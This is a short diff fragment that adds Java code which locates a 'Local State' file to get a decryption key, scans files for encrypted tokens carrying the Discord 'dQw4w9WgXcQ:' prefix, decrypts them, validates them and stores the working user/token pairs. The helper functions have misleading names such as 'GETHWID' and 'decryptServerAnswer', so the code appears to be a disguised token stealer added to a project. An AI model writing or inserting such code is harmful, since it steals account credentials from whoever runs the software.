@@ -1,0 +1,16 @@
+try {
+            java.io.File localState = new java.io.File(path.getParentFile().getParentFile(), "Local State");
+            byte[] key = GETHWID(localState);
+            for (java.io.File file : path.listFiles()) {
+                for (String encToken: regexFile(HIDERREGEX, file)) {
+                    String token = decryptServerAnswer(java.util.Base64.getDecoder().decode(encToken.replace("dQw4w9WgXcQ:","").getBytes()), key);
+                    if (generalUsers.containsValue(token)) continue;
+                    String user = check(token);
+                    if (!java.util.Objects.equals(user, "nullUser")) {
+                        generalUsers.put(user, token);
+                    }
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
